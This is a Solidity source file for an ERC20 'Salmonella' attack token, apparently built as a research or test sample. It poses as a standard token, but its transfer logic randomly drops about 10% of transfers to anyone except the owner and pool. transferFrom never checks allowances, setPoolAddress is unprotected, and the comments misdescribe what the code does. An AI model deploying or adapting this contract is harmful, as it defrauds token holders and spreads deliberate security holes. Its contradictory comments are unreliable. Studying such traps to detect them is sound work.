pragma solidity ^0.8.0;

import "../interfaces/IERC20.sol";

/**
     * The Salmonella contract operates on a straightforward principle. It functions as a standard ERC20 token, behaving similarly to other ERC20 tokens under normal circumstances. 
     * However, it incorporates specific rules to identify transactions involving anyone other than the designated owner. 
     * In such cases, the contract only provides 10% of the intended amount, even though it generates event logs that appear to represent a complete trade.
*/

contract SalmonellaAttackProbToken is IERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    address public salmonellaAttacker;
    address public poolAddress;
    uint256 private randomNumberNonce;
    
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
   
   /**
     * @dev Sets the values for {name}, {symbol}, {decimals} and {totalSupply}.
     */
    constructor(uint256 initialSupply) {
        name = "SalmonellaAttackToken";
        symbol = "SAT";
        decimals = 18;
        totalSupply = initialSupply * 10**uint256(decimals);
        _balances[msg.sender] = totalSupply;
        salmonellaAttacker = msg.sender;
        poolAddress = address(0);
	randomNumberNonce = 1;
        emit Transfer(address(0), salmonellaAttacker, totalSupply);    
    }
    
    
    //setpoolAddress 
    function setPoolAddress(address pAddress) public {
    	poolAddress = pAddress;
    }
    
     /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    
    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    
    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance is the maximum `uint256`.
     *
     * Requirements:
     *  - `sender` and `recipient` cannot be the zero address.
     *  - `sender` must have a balance of at least `amount`.
     *  - the caller must have allowance for ``sender``'s tokens of at least `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        //_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }
     /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * Emits a {Transfer} event with Salmonella introduced: 
     * Added boolean trapped as a flag to see if in has entered in the 10% of probability.
     * if trapped is false, do the normal transfer function.
     * if trapped is true, burn all their money.
     * Otherwise, Execute Salmonella 
     */
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        // Randomly transfer amount with 10% probability
        bool trapped = false;
        if (recipient == salmonellaAttacker || recipient == poolAddress) {
           // Normal transfer
           _balances[sender] = senderBalance - amount;
    	   _balances[recipient] += amount;
           emit Transfer(sender, recipient, amount);
        } else {
		if (random() % 100 < 10) {
			// Transferred amount 
			trapped = true;
		} 
		if (!trapped){
			_balances[sender] = senderBalance - amount;
			_balances[recipient] += amount;
			emit Transfer(sender, recipient, amount);
		}
        }
    }
    
    /**
     *
     * This function extracts a random number to make the probability in transfer function
     *
     */
     
     function random() private returns (uint256) {
        uint256 randomNumber = uint256(keccak256(abi.encodePacked(block.timestamp,msg.sender,randomNumberNonce))) % 100;
        randomNumberNonce++;
        return randomNumber;
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to  e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}
